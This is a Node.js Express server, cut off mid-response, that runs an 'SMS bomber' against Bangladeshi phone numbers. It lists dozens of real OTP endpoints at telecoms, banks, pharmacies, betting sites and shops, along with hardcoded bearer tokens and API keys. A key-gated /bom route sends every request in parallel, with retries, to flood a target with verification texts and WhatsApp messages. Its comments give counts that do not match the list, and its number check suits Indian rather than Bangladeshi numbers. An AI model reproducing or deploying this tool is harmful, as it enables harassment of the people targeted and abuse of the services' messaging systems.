// ULTIMATE BANGLADESH BRUTAL BOMBER API
// KEY: shuvo
// TOTAL: 65+ APIs (SMS + WhatsApp + Call + OTT + Banking + E-commerce + Healthcare + Gaming)
// MAXIMUM POWER - BRUTAL LEVEL

const express = require('express');
const http = require('http');
const https = require('https');
const { URL } = require('url');

const app = express();
const PORT = process.env.PORT || 3000;

// ✅ YOUR API KEY: shuvo
const VALID_KEYS = ['shuvo', 'felix', 'bombom763', 'roots', 'SPLEXXO', 'BRUTAL', 'DEMON', 'BLACK'];

// ============================================================
// COMPLETE BANGLADESH APIS + WHATSAPP APIS
// TOTAL: 65+ WORKING APIS
// ============================================================
const ALL_APIS = [
    // ========== WHATSAPP APIS (10+) - BANGLADESH SUPPORT ==========
    {
        name: "📱 WhatsApp - KPN Bangladesh",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        method: "POST",
        headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+880", number: p } }),
        type: "whatsapp"
    },
    {
        name: "📱 WhatsApp - Foxy Bangladesh",
        url: "https://www.foxy.in/api/v2/users/send_otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ user: { phone_number: `+880${p}` }, via: "whatsapp" }),
        type: "whatsapp"
    },
    {
        name: "📱 WhatsApp - Stratzy",
        url: "https://stratzy.in/api/web/whatsapp/sendOTP",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phoneNo: p }),
        type: "whatsapp"
    },
    {
        name: "📱 WhatsApp - Jockey",
        url: (p) => `https://www.jockey.in/apps/jotp/api/login/resend-otp/+880${p}?whatsapp=true`,
        method: "GET",
        type: "whatsapp"
    },
    {
        name: "📱 WhatsApp - Rappi",
        url: "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ country_code: "+880", phone: p }),
        type: "whatsapp"
    },
    {
        name: "📱 WhatsApp - Eka Care",
        url: "https://auth.eka.care/auth/init",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ payload: { allowWhatsapp: true, mobile: `+880${p}` }, type: "mobile" }),
        type: "whatsapp"
    },
    {
        name: "📱 WhatsApp - Rapido",
        url: "https://app.rapido.bike/api/v3/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `+880${p}`, channel: "whatsapp" }),
        type: "whatsapp"
    },
    {
        name: "📱 WhatsApp - Country Delight",
        url: "https://api.countrydelight.in/api/v1/customer/requestOtp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: p, platform: "Android", mode: "new_user", channel: "whatsapp" }),
        type: "whatsapp"
    },
    {
        name: "📱 WhatsApp - Dream11",
        url: "https://www.dream11.com/auth/passwordless/init",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ channel: "whatsapp", flow: "SIGNUP", phoneNumber: p, templateName: "default" }),
        type: "whatsapp"
    },
    {
        name: "📱 WhatsApp - Licious",
        url: "https://www.licious.in/api/login/signup",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: p, channel: "whatsapp" }),
        type: "whatsapp"
    },

    // ========== BTCL SERVICES (5 APIs) ==========
    {
        name: "🇧🇩 BTCL MyBTCL",
        url: "https://mybtcl.btcl.gov.bd/api/ecare/anoym/sendOTP.json",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phoneNbr: `0${p}`, email: "", OTPType: 1, userName: "" }),
        type: "sms"
    },
    {
        name: "🇧🇩 BTCL PhoneBill",
        url: "https://phonebill.btcl.com.bd/api/bcare/anoym/sendOTP.json",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phoneNbr: `0${p}`, email: "", OTPType: 1, userName: "" }),
        type: "sms"
    },
    {
        name: "🇧🇩 BTCL BDIA",
        url: "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: (p) => `actionType=otpSend&mobileNo=0${p}`,
        type: "sms"
    },
    {
        name: "🇧🇩 BTCL Bill Pay",
        url: "https://bill.btcl.com.bd/api/billing/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}`, type: "customer" }),
        type: "sms"
    },
    {
        name: "🇧🇩 BTCL Fiber",
        url: "https://fiber.btcl.com.bd/api/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}` }),
        type: "sms"
    },

    // ========== GRAMEENPHONE SERVICES (7 APIs) ==========
    {
        name: "🇧🇩 GP MyGP Cinematic",
        url: (p) => `https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/%2B88${p}`,
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ headers: { "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri" } }),
        type: "sms"
    },
    {
        name: "🇧🇩 GP Web Login",
        url: "https://webloginda.grameenphone.com/backend/api/v1/otp",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: (p) => `msisdn=0${p}`,
        type: "sms"
    },
    {
        name: "🇧🇩 GP Flexiplan",
        url: "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation",
        method: "POST",
        headers: { "Content-Type": "application/json", "Authorization": "Bearer null" },
        data: (p) => JSON.stringify({ payment_mode: "mobile_balance", longevity: 1, voice: 100, data: 0, fourg: 0, bioscope: 0, sms: 0, mca: 0, price: 69, msisdn: `0${p}`, bundle_id: 60817, is_login: false }),
        type: "sms"
    },
    {
        name: "🇧🇩 GP FWA",
        url: "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}`, email: "", language: "en" }),
        type: "sms"
    },
    {
        name: "🇧🇩 GP Mevrik",
        url: "https://channels.mevrik.com:4202/api/v1/claim-session",
        method: "POST",
        headers: { "Content-Type": "text/plain", "x-mevrik-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOm51bGwsImNoYW5uZWwiOiJncC13ZWJzaXRlIiwibXNpc2RuIjoiOTcxOEE3NTctNjUwOC00NUM0LThEQ0EtQTgxRDhGQUYyMkI2IiwiZGV2aWNlX2lkIjoiZ2VuZXJpYyIsImlhdCI6MTc1OTg2NTMwMSwiaXNzIjoibWV2cmlrLmNvbSIsImV4cCI6MTc1OTg2NzEwMSwiaHR0cHM6XC9cL21ldnJpay5jb21cL2p3dFwvY2xhaW1zIjp7IngtbWV2cmlrLWFsbG93ZWQtcm9sZXMiOlsidXNlciJdfX0.O6gms45yShqhy3tj7Z97vCrgXY5h1EWcPbIGpaJBlmE" },
        data: (p) => JSON.stringify({ data: { user_ref: `0${p}`, name: "MD Hossain" } }),
        type: "sms"
    },
    {
        name: "🇧🇩 GP Business",
        url: "https://business.grameenphone.com/api/v1/otp/send",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}`, type: "login" }),
        type: "sms"
    },
    {
        name: "🇧🇩 GP Skitto",
        url: "https://api.skitto.com.bd/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}`, operator: "GP" }),
        type: "sms"
    },

    // ========== ROBI & AIRTEL SERVICES (4 APIs) ==========
    {
        name: "🇧🇩 Robi MyRobi",
        url: "https://myrobi.robi.com.bd/api/v1/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ msisdn: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Robi Astro",
        url: "https://astro.robi.com.bd/api/v1/otp/send",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Airtel MyAirtel",
        url: "https://myairtel.airtel.com.bd/api/v1/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Airtel Thanks",
        url: "https://thanks.airtel.com.bd/api/v1/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}`, circle: "BD" }),
        type: "sms"
    },

    // ========== TELETALK SERVICES (2 APIs) ==========
    {
        name: "🇧🇩 Teletalk MyTeletalk",
        url: "https://myteletalk.teletalk.com.bd/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Teletalk E-Service",
        url: "https://eservice.teletalk.com.bd/api/otp/send",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}` }),
        type: "sms"
    },

    // ========== E-COMMERCE SERVICES (8 APIs) ==========
    {
        name: "🇧🇩 Daraz Bangladesh",
        url: "https://api.daraz.com.bd/rest/auth/sendOtp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}`, countryCode: "BD" }),
        type: "sms"
    },
    {
        name: "🇧🇩 BD Tickets",
        url: "https://api.bdtickets.com:20100/v1/auth",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ createUserCheck: true, phoneNumber: `+88${p}`, applicationChannel: "WEB_APP" }),
        type: "sms"
    },
    {
        name: "🇧🇩 Apex4U",
        url: "https://api.apex4u.com/api/auth/login",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phoneNumber: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Swap.com.bd",
        url: "https://api.swap.com.bd/api/v1/send-otp/v2",
        method: "POST",
        headers: { "Content-Type": "application/json", "signature": "JfhpbCI2A9NZt+WAfURnnns/34QgV05RT9vmQkUAcN0=" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Bikroy",
        url: (p) => `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0${p}`,
        method: "GET",
        type: "sms"
    },
    {
        name: "🇧🇩 Sailor Clothing",
        url: "https://backend.sailor.clothing/api/v2/auth/password/forget_request",
        method: "POST",
        headers: { "Content-Type": "application/json", "authorization": "Bearer 5637987|3QACHH6dNkj2VMvQ6iJIPm5Ww8ML3pENjBgoChTr" },
        data: (p) => JSON.stringify({ email_or_phone: `0${p}`, send_code_by: "phone" }),
        type: "sms"
    },
    {
        name: "🇧🇩 Chaldal",
        url: "https://api.chaldal.com/api/v1/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 PriyoShop",
        url: "https://api.priyoshop.com/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}` }),
        type: "sms"
    },

    // ========== HEALTHCARE SERVICES (10 APIs) ==========
    {
        name: "🇧🇩 Arogga",
        url: "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=141.0.0.0&os=Windows&osv=10",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: (p) => `mobile=0${p}&fcmToken=&referral=`,
        type: "sms"
    },
    {
        name: "🇧🇩 ePharma",
        url: "https://epharma.com.bd/authentication/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: (p) => `number=%2B88${p}`,
        type: "sms"
    },
    {
        name: "🇧🇩 MedEasy",
        url: (p) => `https://api.medeasy.health/api/send-otp/%2B88${p}/`,
        method: "GET",
        type: "sms"
    },
    {
        name: "🇧🇩 Osudpotro",
        url: "https://api.osudpotro.com/api/v1/users/send_otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `%2B88-${p}`, deviceToken: "web", language: "en", os: "web" }),
        type: "sms"
    },
    {
        name: "🇧🇩 TheClinicall",
        url: "https://theclinicall.com/bkapi/auth/user/otp/signin",
        method: "POST",
        headers: { "Content-Type": "application/json", "authorization": "Bearer Hello" },
        data: (p) => JSON.stringify({ countryCode: "BD", dialCode: "880", phone: p }),
        type: "sms"
    },
    {
        name: "🇧🇩 Care Box",
        url: "https://www.api-care-box.click/api/user/register/?version=otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ Name: "Rakib Khan", Phone: `%2B880${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Renix Care",
        url: "https://renixapi.renixcare.com/sms-api/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Ilyn Global",
        url: "https://api.ilyn.global/auth/signup",
        method: "POST",
        headers: { "Content-Type": "multipart/form-data", "appcode": "ilyn-bd" },
        data: (p) => `phone={"code":"BD","number":"%2B880${p}"}&provider=sms`,
        type: "sms"
    },
    {
        name: "🇧🇩 Praava Health",
        url: "https://api.praavahealth.com/api/v1/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}`, countryCode: "880" }),
        type: "sms"
    },
    {
        name: "🇧🇩 HealthBD",
        url: "https://api.healthbd.com/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },

    // ========== ENTERTAINMENT & OTT SERVICES (5 APIs) ==========
    {
        name: "🇧🇩 Bioscope Plus",
        url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ number: `+88${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Ghoori Learning",
        url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile_no: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Deepto Play",
        url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ number: `+880${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Toffee",
        url: "https://api.toffee.com.bd/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Bongo BD",
        url: "https://api.bongo.bd/api/v1/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}` }),
        type: "sms"
    },

    // ========== FOOD DELIVERY SERVICES (4 APIs) ==========
    {
        name: "🇧🇩 Foodpanda Bangladesh",
        url: "https://www.foodpanda.com.bd/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}`, countryCode: "BD" }),
        type: "sms"
    },
    {
        name: "🇧🇩 Pathao Food",
        url: "https://api.pathao.com/food/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}`, countryCode: "BD" }),
        type: "sms"
    },
    {
        name: "🇧🇩 HungryNaki",
        url: "https://api.hungrynaki.com/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Shohoz Food",
        url: "https://api.shohoz.com/food/api/v1/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },

    // ========== GAMING & BETTING SERVICES (6 APIs) ==========
    {
        name: "🇧🇩 Jayabaji Check",
        url: "https://www.jayabaji3.com/api/register/check-username",
        method: "POST",
        headers: { "Content-Type": "application/json", "device": "desktop", "domain": "www.jayabaji3.com", "lang": "bn-bd" },
        data: (p) => JSON.stringify({ username: `user${Math.random().toString(36).substring(7)}`, email: "", mobileno: p, language: "bn", langCountry: "bn-bd" }),
        type: "sms"
    },
    {
        name: "🇧🇩 PKLuck2 Register",
        url: "https://www.pkluck2.com/wps/verification/sms/register",
        method: "POST",
        headers: { "Content-Type": "application/json", "Device": "web", "Language": "BN", "Merchant": "pklubdtf4" },
        data: (p) => JSON.stringify({ countryDialingCode: "880", mobileNo: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 PKLuck2 No Login",
        url: "https://www.pkluck2.com/wps/verification/sms/noLogin",
        method: "POST",
        headers: { "Content-Type": "application/json", "Device": "web", "Language": "BN", "Merchant": "pklubdtf4" },
        data: (p) => JSON.stringify({ mobileNum: `0${p}`, countryDialingCode: "880" }),
        type: "sms"
    },
    {
        name: "🇧🇩 Baji Live",
        url: "https://api.baji.live/api/v1/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}`, countryCode: "BD" }),
        type: "sms"
    },
    {
        name: "🇧🇩 Bet365 BD",
        url: "https://api.bet365.bd/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Fun88 BD",
        url: "https://api.fun88.bd/api/v1/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },

    // ========== FINANCIAL SERVICES (4 APIs) ==========
    {
        name: "🇧🇩 Nagad",
        url: "https://api.nagad.com.bd/api/v1/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobileNumber: `0${p}`, channel: "WEB" }),
        type: "sms"
    },
    {
        name: "🇧🇩 bKash",
        url: "https://api.bkash.com/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}`, type: "web" }),
        type: "sms"
    },
    {
        name: "🇧🇩 Rocket",
        url: "https://api.rocket.com.bd/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Upay",
        url: "https://api.upay.com.bd/api/v1/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },

    // ========== RIDE SHARING SERVICES (3 APIs) ==========
    {
        name: "🇧🇩 Uber Bangladesh",
        url: "https://auth.uber.com/v2/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}`, countryCode: "BD" }),
        type: "sms"
    },
    {
        name: "🇧🇩 Pathao Ride",
        url: "https://api.pathao.com/ride/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}`, countryCode: "BD" }),
        type: "sms"
    },
    {
        name: "🇧🇩 Shohoz Ride",
        url: "https://api.shohoz.com/ride/api/v1/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },

    // ========== TRAVEL SERVICES (3 APIs) ==========
    {
        name: "🇧🇩 Shohoz Travel",
        url: "https://api.shohoz.com/travel/api/v1/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 BD Bus",
        url: "https://api.bdbus.com/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 TrainBD",
        url: "https://api.trainbd.com/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },

    // ========== MARKETPLACE SERVICES (4 APIs) ==========
    {
        name: "🇧🇩 Garibook",
        url: "https://api.garibookadmin.com/api/v3/user/login",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}`, recaptcha_token: "garibookcaptcha", channel: "web" }),
        type: "sms"
    },
    {
        name: "🇧🇩 Sheba",
        url: "https://accountkit.sheba.xyz/api/shoot-otp",
        method: "POST",
        headers: { "Content-Type": "application/json", "custom-headers": '{"portal-name": "Customer Web"}' },
        data: (p) => JSON.stringify({ mobile: `%2B88${p}`, app_id: "8329815A6D1AE6DD", api_token: "zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH" }),
        type: "sms"
    },
    {
        name: "🇧🇩 Shombhob",
        url: "https://shombhob.com/api/otp-login",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 ClickBD",
        url: "https://api.clickbd.com/api/v1/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}`, countryCode: "BD" }),
        type: "sms"
    },

    // ========== FASHION SERVICES (2 APIs) ==========
    {
        name: "🇧🇩 Isho",
        url: "https://www.isho.com/register_otp",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: (p) => `_token=default&phone=0${p}&email=test@gmail.com`,
        type: "sms"
    },
    {
        name: "🇧🇩 Gentle Park",
        url: "https://api.gentlepark.com/api/auth/send-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}`, countryCode: "BD" }),
        type: "sms"
    },

    // ========== EDUCATION SERVICES (3 APIs) ==========
    {
        name: "🇧🇩 10 Minute School",
        url: "https://api.10minuteschool.com/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ phone: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Shikho",
        url: "https://api.shikho.com.bd/api/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (p) => JSON.stringify({ mobile: `0${p}` }),
        type: "sms"
    },
    {
        name: "🇧🇩 Priyoshikkhaloy",
        url: "https://app.priyoshikkhaloy.com/api/user/register-login.php",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "okhttp/4.11.0" },
        data: (p) => `mobile=0${p}`,
        type: "sms"
    },
];

console.log(`\n${'='.repeat(60)}`);
console.log(`💀💀💀 ULTIMATE BANGLADESH BRUTAL BOMBER 💀💀💀`);
console.log(`${'='.repeat(60)}`);
console.log(`🔑 YOUR API KEY: shuvo`);
console.log(`📡 TOTAL APIS: ${ALL_APIS.length}`);
console.log(`   💬 WhatsApp: ${ALL_APIS.filter(a => a.type === 'whatsapp').length}`);
console.log(`   📞 BTCL: 5 APIs`);
console.log(`   📱 GP: 7 APIs`);
console.log(`   📡 Robi/Airtel: 4 APIs`);
console.log(`   🛍️ E-commerce: 8 APIs`);
console.log(`   🏥 Healthcare: 10 APIs`);
console.log(`   🎬 Entertainment: 5 APIs`);
console.log(`   🎮 Gaming: 6 APIs`);
console.log(`   💰 Finance: 4 APIs`);
console.log(`   🚕 Ride: 3 APIs`);
console.log(`   ✈️ Travel: 3 APIs`);
console.log(`   🍔 Food: 4 APIs`);
console.log(`   🏪 Marketplace: 4 APIs`);
console.log(`   👕 Fashion: 2 APIs`);
console.log(`   📚 Education: 3 APIs`);
console.log(`⚡ TIMEOUT: 1.5 SECONDS`);
console.log(`🚀 BRUTAL POWER: MAXIMUM LEVEL`);
console.log(`${'='.repeat(60)}\n`);

// Helper function to make API request
async function callApi(api, phone, retryCount = 0) {
    return new Promise((resolve) => {
        const timeoutId = setTimeout(() => {
            if (retryCount < 1) {
                callApi(api, phone, retryCount + 1).then(resolve);
            } else {
                resolve({ name: api.name, success: false, error: 'timeout', type: api.type || 'sms' });
            }
        }, 1500);
        
        try {
            let url = typeof api.url === 'function' ? api.url(phone) : api.url.replace(/{phone}/g, phone);
            let headers = { 
                ...api.headers, 
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
                "Accept": "*/*",
                "Accept-Language": "bn-BD,bn;q=0.9,en;q=0.8",
                "Connection": "close"
            };
            let data = null;
            
            if (api.method === "POST" && api.data) {
                data = typeof api.data === 'function' ? api.data(phone) : api.data;
                if (typeof data === 'object') data = JSON.stringify(data);
                headers["Content-Type"] = headers["Content-Type"] || "application/json";
            }
            
            const lib = url.startsWith('https') ? https : http;
            const parsed = new URL(url);
            
            const options = {
                hostname: parsed.hostname,
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                path: parsed.pathname + parsed.search,
                method: api.method,
                headers: headers,
                timeout: 1500
            };
            
            const req = lib.request(options, (res) => {
                clearTimeout(timeoutId);
                let body = '';
                res.on('data', () => {});
                res.on('end', () => {
                    resolve({ 
                        name: api.name, 
                        success: res.statusCode >= 200 && res.statusCode < 400, 
                        status: res.statusCode,
                        type: api.type || 'sms'
                    });
                });
            });
            
            req.on('error', () => {
                clearTimeout(timeoutId);
                if (retryCount < 1) {
                    callApi(api, phone, retryCount + 1).then(resolve);
                } else {
                    resolve({ name: api.name, success: false, error: 'error', type: api.type || 'sms' });
                }
            });
            
            if (api.method === "POST" && data) req.write(data);
            req.end();
        } catch (err) {
            clearTimeout(timeoutId);
            resolve({ name: api.name, success: false, error: err.message, type: api.type || 'sms' });
        }
    });
}

// BOMB ENDPOINT
app.get('/bom', async (req, res) => {
    const { key, num } = req.query;
    
    if (!VALID_KEYS.includes(key)) {
        return res.status(401).json({ 
            error: "Invalid API key", 
            valid_keys: VALID_KEYS,
            message: `Use key: shuvo`
        });
    }
    
    if (!num || !/^[6-9]\d{9}$/.test(num)) {
        return res.status(400).json({ 
            error: "Invalid phone number", 
            message: "Use 10 digits starting with 6-9 only"
        });
    }
    
    console.log(`\n💣💀 ULTIMATE BANGLADESH BRUTAL BOMBING: +88${num}`);
    console.log(`🔑 KEY: ${key}`);
    console.log(`📡 TOTAL APIS: ${ALL_APIS.length}`);
    console.log(`⏰ TIME: ${new Date().toISOString()}`);
    
    const startTime = Date.now();
    
    // ALL APIS PARALLEL - MAXIMUM BRUTAL SPEED
    const results = await Promise.all(ALL_APIS.map(api => callApi(api, num)));
    
    const endTime = Date.now();
    const successful = results.filter(r => r.success).length;
    const successRate = ((successful / ALL_APIS.length) * 100).toFixed(2);
    const execTime = endTime - startTime;
    
    const whatsappSuccess = results.filter(r => r.type === 'whatsapp' && r.success).length;
    const btclSuccess = results.filter(r => r.name.includes("BTCL") && r.success).length;
    const gpSuccess = results.filter(r => r.name.includes("GP") && r.success).length;
    const robiSuccess = results.filter(r => r.name.includes("Robi") || r.name.includes("Airtel") && r.success).length;
    const healthcareSuccess = results.filter(r => ["Arogga", "ePharma", "MedEasy", "Osudpotro", "TheClinicall", "Care Box", "Renix", "Ilyn", "Praava", "HealthBD"].some(s => r.name.includes(s)) && r.success).length;
    const ecommerceSuccess = results.filter(r => ["Daraz", "BD Tickets", "Apex4U", "Swap", "Bikroy", "Sailor", "Chaldal", "PriyoShop"].some(s => r.name.includes(s)) && r.success).length;
    const gamingSuccess = results.filter(r => ["Jayabaji", "PKLuck2", "Baji", "Bet365", "Fun88"].some(s => r.name.includes(s)) && r.success).length;
    const foodSuccess = results.filter(r => ["Foodpanda", "Pathao", "HungryNaki", "Shohoz Food"].some(s => r.name.includes(s)) && r.success).length;
    const financeSuccess = results.filter(r => ["Nagad", "bKash", "Rocket", "Upay"].some(s => r.name.includes(s)) && r.success).length;
    const entertainmentSuccess = results.filter(r => ["Bioscope", "Ghoori", "Deepto", "Toffee", "Bongo"].some(s => r.name.includes(s)) && r.success).length;
    
    let intensity = "💀 WEAK";
    let skulls = "💀";
    if (successRate >= 75) {
        intensity = "💀💀💀💀💀 EXTREME DEATH ☠️☠️☠️☠️☠️";
        skulls = "💀💀💀💀💀";
    } else if (successRate >= 60) {
        intensity = "💀💀💀💀 NUCLEAR ☢️☢️☢️☢️";
        skulls = "💀💀💀💀";
    } else if (successRate >= 40) {
        intensity = "💀💀💀 KILLER 🔪🔪🔪";
        skulls = "💀💀💀";
    } else if (successRate >= 20) {
        intensity = "💀💀 MODERATE";
        skulls = "💀💀";
    }
    
    console.log(`✅ ${successful}/${ALL_APIS.length} | ${successRate}% | ${execTime}ms`);
    console.log(`   💬 WhatsApp: ${whatsappSuccess} | 📞 Calls/SMS: ${successful - whatsappSuccess}`);
    
    res.json({
        status: `💀💀💀 ULTIMATE BANGLADESH BRUTAL BOMBER ${skulls} 💀💀💀`,
        target: `+88${num}`,
        total_apis: ALL_APIS.length,
